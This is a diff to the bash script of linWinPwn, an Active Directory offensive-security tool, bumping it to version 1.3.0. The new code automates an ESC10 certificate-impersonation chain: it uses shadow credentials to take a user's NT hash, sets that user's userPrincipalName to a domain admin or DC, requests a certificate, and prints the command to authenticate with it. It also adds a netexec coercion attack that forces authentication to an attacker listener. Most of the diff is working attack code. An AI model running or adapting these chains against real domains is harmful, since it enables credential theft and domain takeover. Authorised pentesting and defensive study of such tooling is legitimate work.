@@ -151,7 +151,7 @@ print_banner() {
       | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
       |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 
 
-      ${BLUE}linWinPwn: ${CYAN}version 1.2.9 ${NC}
+      ${BLUE}linWinPwn: ${CYAN}version 1.3.0 ${NC}
       https://github.com/lefayjey/linWinPwn
       ${BLUE}Author: ${CYAN}lefayjey${NC}
       ${BLUE}Inspired by: ${CYAN}S3cur3Th1sSh1t's WinPwn${NC}
@@ -809,7 +809,7 @@ authenticate() {
             argument_godap="-d ${domain} -k -t ldap/${target}"
             argument_mssqlpwner=" -k -no-pass ${domain}/'${user}'"
             argument_gpopars="-d ${domain} -u '${user}' -k"
-            argument_gpb="-d ${dc_domain} -u '${user}' -k'"
+            argument_gpb="-d ${dc_domain} -u '${user}' -k"
             argument_nhd="-d ${dc_domain} -u '${user}' -k"
             auth_string="${YELLOW}[i]${NC} Authentication method: ${YELLOW}Kerberos Ticket of $user located at $(realpath "$krb5cc")${NC}"
         else
@@ -2026,31 +2026,13 @@ adcs_vuln_parse() {
             echo -e "${CYAN}2. Change userPrincipalName of second_user to Domain Admin (UPN spoofing):${NC}"
             echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn [ Domain Admin ]@${dc_domain} -dc-ip ${dc_ip} ${ldaps_param} ${ldapbindsign_param}"
             echo -e "${CYAN}3. Request vulnerable certificate as second_user:${NC}"
-            echo -e "${certipy} req -username <second_user>@${dc_domain} -hash <second_user_hash> -target [ ${pki_servers} ] -ca [ \"${pki_cas//SPACE/ }\" ] -template ${vulntemp} -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapbindsign_param}"
+            echo -e "${certipy} req -username <second_user>@${dc_domain} -hashes <second_user_hash> -target [ ${pki_servers} ] -ca [ \"${pki_cas//SPACE/ }\" ] -template ${vulntemp} -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapbindsign_param}"
             echo -e "${CYAN}4. Change second_user's UPN back:${NC}"
             echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn <second_user>@${dc_domain} -dc-ip ${dc_ip} ${ldaps_param} ${ldapbindsign_param}"
             echo -e "${CYAN}5. Authenticate as the target administrator:${NC}"
             echo -e "${certipy} auth -pfx [ Domain Admin ].pfx -dc-ip ${dc_ip} ${ldaps_param}"
         done
     fi
-
-    echo -e "\n${YELLOW}[!] Manually check for ESC10 vulnerability by querying the registry:${NC}"
-    echo -e "reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL"
-    echo -e "CertificateMappingMethods    REG_DWORD    0x4 ${GREEN}<== VULNERABLE${NC} "
-    echo -e "${YELLOW}[!] If vulnerable to ESC10, follow steps below for exploitation:${NC}"
-    echo -e "${BLUE}# \"${pki_cas//SPACE/ }\" certificate authority${NC}"
-    echo -e "${CYAN}1. Retrieve second_user's NT hash Shadow Credentials (GenericWrite against second_user):${NC}"
-    echo -e "${certipy} shadow auto ${argument_certipy} -account <second_user> -dc-ip ${dc_ip} ${ldaps_param} ${ldapbindsign_param}"
-    echo -e "${CYAN}2. Change userPrincipalName of second_user to Domain Admin or DC (UPN spoofing):${NC}"
-    echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn [ Domain Admin ]@${dc_domain} -dc-ip ${dc_ip} ${ldaps_param} ${ldapbindsign_param}"
-    echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn ${dc_NETBIOS}\\\$@${dc_domain} -dc-ip ${dc_ip} ${ldaps_param} ${ldapbindsign_param}"
-    echo -e "${CYAN}3. Request certificate permitting client authentication as second_user:${NC}"
-    echo -e "${certipy} req -username <second_user>@${dc_domain} -hash <second_user_hash> -ca \"${pki_cas//SPACE/ }\" -template [ User ] -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapbindsign_param}"
-    echo -e "${CYAN}4. Change second_user's UPN back:${NC}"
-    echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn <second_user>@${dc_domain} -dc-ip ${dc_ip} ${ldaps_param} ${ldapbindsign_param}"
-    echo -e "${CYAN}5. Authenticate using pfx of Domain Admin or DC:${NC}"
-    echo -e "${certipy} auth -pfx [ Domain Admin ].pfx -dc-ip ${dc_ip} ${ldaps_param}"
-    echo -e "${certipy} auth -pfx ${dc_NETBIOS}$.pfx -dc-ip ${dc_ip} ${ldaps_param}"
 
     esc11_vuln=$(/usr/bin/jq -r '."Certificate Authorities"[] | select (."[!] Vulnerabilities"."ESC11") | ."CA Name"' "${ADCS_dir}/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u | sed "s/ /SPACE/g")
     if [[ -n $esc11_vuln ]]; then
@@ -2178,10 +2160,10 @@ certipy_ca_dump() {
     if ! stat "${certipy}" >/dev/null 2>&1; then
         echo -e "${RED}[-] Please verify the installation of certipy${NC}"
     else
-        echo -e "${BLUE}[*] Certipy extract CAs and forge Golden Certificate${NC}"
         if [ "${nullsess_bool}" == true ]; then
             echo -e "${PURPLE}[-] certipy requires credentials${NC}"
         else
+        echo -e "${BLUE}[*] Certipy extract CAs and forge Golden Certificate${NC}"
             ne_adcs_enum
             domain_DN=$(fqdn_to_ldap_dn "${dc_domain}")
             current_dir=$(pwd)
@@ -3080,6 +3062,27 @@ coerceplus_check() {
     echo -e ""
 }
 
+coerce_netexec() {
+    echo -e "${BLUE}[*] Coercing using netexec${NC}"
+
+    echo -e "${YELLOW}[*] Please verify that ntlmrelayx or Responder are running, and then press ENTER to continue....${NC}"
+    read -rp "" </dev/tty
+
+    echo -e "${BLUE}[*] Please specify hostname of target server:${NC}"
+    echo -e "${CYAN}[*] Example: 10.1.0.5 or DC01 or DC01.domain.com ${NC}"
+    target_coerce=""
+    read -rp ">> " target_coerce </dev/tty
+    while [ "${target_coerce}" == "" ]; do
+        echo -e "${RED}Invalid target.${NC} Please specify target server:"
+        read -rp ">> " target_coerce </dev/tty
+    done
+    echo -e "${CYAN}[*] Example: 10.10.10.10 or kali@80 or localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA ${NC}"
+    set_attackerIP
+    run_command "${netexec} ${ne_verbose} smb ${target_coerce} ${argument_ne} -M coerce_plus -o LISTENER="${attacker_IP}" --log ${Vulnerabilities_dir}/ne_coerce_attack_output_${dc_domain}.txt" 2>&1
+
+    echo -e ""
+}
+
 print_check() {
     echo -e "${BLUE}[*] Print Spooler and PrintNightmare checks ${NC}"
     run_command "${netexec} ${ne_verbose} smb ${curr_targets_list} ${argument_ne} -M spooler --log ${Vulnerabilities_dir}/ne_spooler_output_${dc_domain}.txt" 2>&1
@@ -3957,6 +3960,69 @@ add_upn() {
     echo -e ""
 }
 
+add_upn_esc10() {
+    if ! stat "${certipy}" >/dev/null 2>&1; then
+        echo -e "${RED}[-] Please verify the installation of certipy${NC}"
+    else
+        if [ "${nullsess_bool}" == true ]; then
+            echo -e "${PURPLE}[-] certipy requires credentials${NC}"
+        else
+            if [ "${ldaps_bool}" == true ]; then ldaps_param=""; else ldaps_param="-ldap-scheme ldap"; fi
+            if [ "${dnstcp_bool}" == true ]; then dnstcp_param="-dns-tcp "; else dnstcp_param=""; fi
+            echo -e "\n${YELLOW}[!] Manually check for ESC10 vulnerability by querying the registry:${NC}"
+            echo -e "reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL"
+            echo -e "CertificateMappingMethods    REG_DWORD    0x4 ${GREEN}<== VULNERABLE${NC}"
+            echo -e "${YELLOW}[*] If vulnerable to ESC10, press ENTER to continue....${NC}"
+            read -rp "" </dev/tty
+            echo -e "${BLUE}[*] Retrieve target's NT hash using Shadow Credentials. Please specify target:${NC}"
+            echo -e "${CYAN}[*] Example: user01 ${NC}"
+            target_upn=""
+            read -rp ">> " target_upn </dev/tty
+            while [ "${target_upn}" == "" ]; do
+                echo -e "${RED}Invalid name.${NC} Please specify target:"
+                read -rp ">> " target_upn </dev/tty
+            done
+            echo -e "${BLUE}[*] Please specify NTLM hash of ${target_upn}. Press ENTER to retrieve target's NT hash using Shadow Credentials:${NC}"
+            target_upn_hash=""
+            read -rp ">> " target_upn_hash </dev/tty
+            if [ -z "$target_upn_hash" ]; then
+                if [ "${ldaps_bool}" == true ]; then ldaps_param_ba="-s"; else ldaps_param_ba=""; fi
+                run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param_ba} --host ${dc_FQDN} --dc-ip ${dc_ip} add shadowCredentials '${target_upn}' --path ${Credentials_dir}/shadowcreds_${user_var}_${target_upn}" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_shadowcreds_${dc_domain}.txt"
+                target_upn_hash=$(grep ${target_upn} "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_shadowcreds_${dc_domain}.txt" -A 2| grep '^NT:' | tail -n 1 | cut -d ' ' -f 2 | tr -d ' \r\n')
+            fi
+            if [ -z "$target_upn_hash" ] || ! ([[ (${#target_upn_hash} -eq 65 && "${target_upn_hash:32:1}" == ":") || (${#target_upn_hash} -eq 33 && "${target_upn_hash:0:1}" == ":") || (${#target_upn_hash} -eq 32) ]]); then 
+                echo -e "${RED}[-] Invalid NT hash of ${target_upn}. Aborting... ${NC}"
+            else
+                ne_adcs_enum
+                value_upn=""
+                echo -e "${BLUE}[*] Modifying userPrincipalName of ${target_upn}. Please specify user/machine to impersonate:${NC}"
+                echo -e "${CYAN}[*] Example: user02, DC$ ${NC}"
+                read -rp ">> " value_upn </dev/tty
+                while [ "${value_upn}" == "" ]; do
+                    echo -e "${RED}Invalid name.${NC} Please specify value of upn:"
+                    read -rp ">> " value_upn </dev/tty
+                done
+                run_command "${certipy} account update ${argument_certipy} -user ${target_upn} -upn '${value_upn}'@${dc_domain} -dc-ip ${dc_ip} ${ldaps_param} ${ldapbindsign_param}" | tee -a "${Modification_dir}/certipy_esc10_out_${user_var}.txt"
+                echo -e "${BLUE}[*] Requesting certificate permitting client authentication for ${target_upn}.${NC}"
+                pki_server=$(echo -e "$pki_servers" | sed 's/ /\n/g' | sed -n ${1}p)
+                pki_ca=$(echo -e "$pki_cas" | sed 's/ /\n/g' | sed -n ${1}p)
+                current_dir=$(pwd)
+                cd "${Credentials_dir}" || exit
+                if [ "${kerb_bool}" == true ]; then krb_upn="KRB5CCNAME=''"; krb_param="-k"; else krb_upn=""; krb_param=""; fi
+                run_command "${krb_upn} ${certipy} req -u ${target_upn}@${dc_domain} -hashes ${target_upn_hash} ${krb_param} -dc-ip ${dc_ip} -ns ${dc_ip} ${dnstcp_param} -target ${pki_server} -ca \"${pki_ca//SPACE/ }\" -template User -key-size 4096 ${ldaps_param} ${ldapbindsign_param}" | tee -a "${Modification_dir}/certipy_esc10_out_${user_var}.txt"
+                cd "${current_dir}" || exit
+                echo -e "${BLUE}[*] Modifying userPrincipalName of ${target_upn} back to original value.${NC}"
+                run_command "${certipy} account update ${argument_certipy} -user ${target_upn} -upn ${target_upn}@${dc_domain} -dc-ip ${dc_ip} ${ldaps_param} ${ldapbindsign_param}" | tee -a "${Modification_dir}/certipy_esc10_out_${user_var}.txt"
+                if stat "${Credentials_dir}/${value_upn//\$/}.pfx" >/dev/null 2>&1; then
+                    echo -e "\n${GREEN}[+] Authenticate using pfx of impersonated Admin or DC:${NC}"
+                    echo -e "${certipy} auth -pfx ${Credentials_dir}/${value_upn//\$/}.pfx -dc-ip ${dc_ip} ${ldaps_param} [-ldap-shell]"
+                fi
+            fi
+        fi
+    fi
+    echo -e ""
+}
+
 add_constrained() {
     if ! stat "${bloodyad}" >/dev/null 2>&1; then
         echo -e "${RED}[-] Please verify the installation of bloodyad{NC}"
@@ -4629,7 +4695,7 @@ modify_target() {
 }
 
 set_attackerIP() {
-    echo -e "Please choose the attacker's IPs from the following options:"
+    echo -e "Please choose the attacker's IP. List of current machine's IPs:"
     attacker_IPlist=($(/usr/bin/hostname -I))
     for ip in "${attacker_IPlist[@]}"; do
         echo -e "${YELLOW}${ip}${NC}"
@@ -4642,7 +4708,7 @@ set_attackerIP() {
             echo -e "${RED}Empty input.${NC}"
         fi
         if [[ -z "${attacker_IP}" ]]; then
-            echo -e "${RED}Invalid IP.${NC} Please specify your IP from the list."
+            echo -e "${RED}Invalid IP.${NC} Please specify your attacker's IP."
             read -rp ">> " attacker_IP </dev/tty
         fi
     done
@@ -5814,16 +5880,17 @@ vulns_menu() {
     echo -e "3) Print Spooler and Printnightmare checks using netexec"
     echo -e "4) WebDAV check using netexec"
     echo -e "5) coerce check using netexec"
-    echo -e "6) SMB signing check using netexec"
-    echo -e "7) ntlmv1, smbghost and remove-mic checks using netexec"
-    echo -e "8) RPC Dump and check for interesting protocols"
-    echo -e "9) Coercer RPC scan"
-    echo -e "10) PushSubscription abuse using PrivExchange"
-    echo -e "11) RunFinger scan"
-    echo -e "12) Run LDAPNightmare check"
-    echo -e "13) Run sessions enumeration using netexec (reg-sessions)"
-    echo -e "14) Check for unusual sessions"
-    echo -e "15) Check for BadSuccessor vuln using netexec"
+    echo -e "6) Run coerce attack using netexec"
+    echo -e "7) SMB signing check using netexec"
+    echo -e "8) ntlmv1, smbghost and remove-mic checks using netexec"
+    echo -e "9) RPC Dump and check for interesting protocols"
+    echo -e "10) Coercer RPC scan"
+    echo -e "11) PushSubscription abuse using PrivExchange"
+    echo -e "12) RunFinger scan"
+    echo -e "13) Run LDAPNightmare check"
+    echo -e "14) Run sessions enumeration using netexec (reg-sessions)"
+    echo -e "15) Check for unusual sessions"
+    echo -e "16) Check for BadSuccessor vuln using netexec"
     echo -e "back) Go back"
     echo -e "exit) Exit"
 
@@ -5866,51 +5933,56 @@ vulns_menu() {
         ;;
 
     6)
-        smbsigning_check
+        coerce_netexec
         vulns_menu
         ;;
 
     7)
-        smb_checks
+        smbsigning_check
         vulns_menu
         ;;
 
     8)
-        rpcdump_check
+        smb_checks
         vulns_menu
         ;;
 
     9)
-        coercer_check
+        rpcdump_check
         vulns_menu
         ;;
 
     10)
-        privexchange_check
+        coercer_check
         vulns_menu
         ;;
 
     11)
-        runfinger_check
+        privexchange_check
         vulns_menu
         ;;
 
     12)
-        ldapnightmare_check
+        runfinger_check
         vulns_menu
         ;;
 
     13)
-        regsessions_check
+        ldapnightmare_check
         vulns_menu
         ;;
 
     14)
-        findunusess_check
+        regsessions_check
         vulns_menu
         ;;
 
     15)
+        findunusess_check
+        vulns_menu
+        ;;
+
+    16)
         badsuccessor_check
         vulns_menu
         ;;
@@ -6175,28 +6247,29 @@ modif_menu() {
     echo -e "-------------------------------------------------------------"
     echo -e "${YELLOW}[i]${NC} Current target(s): ${YELLOW} ${curr_targets}${custom_servers}${custom_ip}${NC} - Number of server(s): ${YELLOW}$(wc -l < "${curr_targets_list}")${NC}"
     echo -e "m) Modify target(s)"
-    echo -e "1) Change user or computer password (Requires: ForceChangePassword on user or computer)"
-    echo -e "2) Add user to group (Requires: GenericWrite or GenericAll on group)"
-    echo -e "3) Remove user from group (Requires: GenericWrite or GenericAll on group)"
+    echo -e "1) Change user or computer password (Requires: ${PURPLE}ForceChangePassword${NC})"
+    echo -e "2) Add user to group (Requires: ${PURPLE}AddMember${NC} on group)"
+    echo -e "3) Remove user from group (Requires: ${PURPLE}AddMember${NC} on group)"
     echo -e "4) Add new computer (Requires: MAQ > 0)"
-    echo -e "5) Add new DNS entry"
-    echo -e "6) Enable account"
-    echo -e "7) Disable account"
-    echo -e "8) Change Owner of target (Requires: WriteOwner permission)"
-    echo -e "9) Add GenericAll rights on target (Requires: Owner permission)"
-    echo -e "10) Delete object (Requires: GenericWrite or GenericAll on object)"
-    echo -e "11) Restore deleted object (Requires: GenericWrite or GenericAll on OU of deleted object)"
-    echo -e "12) Targeted Kerberoast Attack (Noisy!)"
-    echo -e "13) Perform RBCD attack (Requires: GenericWrite or GenericAll or AllowedToAct on computer)"
-    echo -e "14) Perform RBCD attack on SPN-less user (Requires: GenericWrite or GenericAll or AllowedToAct on computer & MAQ=0)"
-    echo -e "15) Perform ShadowCredentials attack (Requires: AddKeyCredentialLink)"
-    echo -e "16) Remove added ShadowCredentials (Requires: AddKeyCredentialLink)"
-    echo -e "17) Abuse GPO to execute command (Requires: GenericWrite or GenericAll on GPO)"
-    echo -e "18) Add Unconstrained Delegation rights - uac: TRUSTED_FOR_DELEGATION (Requires: SeEnableDelegationPrivilege rights)"
-    echo -e "19) Add CIFS and HTTP SPNs entries to computer with Unconstrained Deleg rights - ServicePrincipalName & msDS-AdditionalDnsHostName (Requires: Owner of computer)"
-    echo -e "20) Add userPrincipalName to perform Kerberos impersonation of another user (Requires: GenericWrite or GenericAll on user)"
-    echo -e "21) Add Constrained Delegation rights - uac: TRUSTED_TO_AUTH_FOR_DELEGATION (Requires: SeEnableDelegationPrivilege rights)"
-    echo -e "22) Add HOST and LDAP SPN entries of DC to computer with Constrained Deleg rights - msDS-AllowedToDelegateTo (Requires: Owner of computer)"
+    echo -e "5) Add new DNS entry (Requires: Modification of DNS)"
+    echo -e "6) Enable account (Requires: ${PURPLE}GenericWrite${NC})"
+    echo -e "7) Disable account (Requires: ${PURPLE}GenericWrite${NC})"
+    echo -e "8) Change Owner of target (Requires: ${PURPLE}WriteOwner${NC} permission)"
+    echo -e "9) Add GenericAll rights on target (Requires: ${PURPLE}Owner${NC} of object)"
+    echo -e "10) Delete user or computer (Requires: ${PURPLE}GenericWrite${NC})"
+    echo -e "11) Restore deleted user or computer (Requires: ${PURPLE}GenericWrite${NC} on OU of deleted object)"
+    echo -e "12) Targeted Kerberoast Attack (Noisy!) (Requires: ${PURPLE}WriteSPN${NC})"
+    echo -e "13) Perform RBCD attack (Requires: ${PURPLE}AllowedToAct${NC} on computer)"
+    echo -e "14) Perform RBCD attack on SPN-less user (Requires: ${PURPLE}AllowedToAct${NC} on computer & MAQ=0)"
+    echo -e "15) Perform ShadowCredentials attack (Requires: ${PURPLE}AddKeyCredentialLink${NC})"
+    echo -e "16) Remove added ShadowCredentials (Requires: ${PURPLE}AddKeyCredentialLink${NC})"
+    echo -e "17) Abuse GPO to execute command (Requires: ${PURPLE}GenericWrite${NC} on GPO)"
+    echo -e "18) Add Unconstrained Delegation rights - uac: TRUSTED_FOR_DELEGATION (Requires: ${PURPLE}SeEnableDelegationPrivilege${NC} rights)"
+    echo -e "19) Add CIFS and HTTP SPNs entries to computer with Unconstrained Deleg rights - ServicePrincipalName & msDS-AdditionalDnsHostName (Requires: ${PURPLE}Owner${NC} of computer)"
+    echo -e "20) Add userPrincipalName to perform Kerberos impersonation of another user (Requires: ${PURPLE}GenericWrite${NC} on user)"
+    echo -e "21) Modify userPrincipalName to perform Certificate impersonation (UPN Spoofing - ESC10) (Requires: ${PURPLE}GenericWrite${NC} on user)"
+    echo -e "22) Add Constrained Delegation rights - uac: TRUSTED_TO_AUTH_FOR_DELEGATION (Requires: ${PURPLE}SeEnableDelegationPrivilege${NC} rights)"
+    echo -e "23) Add HOST and LDAP SPN entries of DC to computer with Constrained Deleg rights - msDS-AllowedToDelegateTo (Requires: ${PURPLE}Owner${NC} of computer)"
     echo -e "back) Go back"
     echo -e "exit) Exit"
 
@@ -6303,11 +6376,16 @@ modif_menu() {
         ;;
 
     21)
-        add_constrained
+        add_upn_esc10
         modif_menu
         ;;
 
     22)
+        add_constrained
+        modif_menu
+        ;;
+
+    23)
         add_spn_constrained
         modif_menu
         ;;
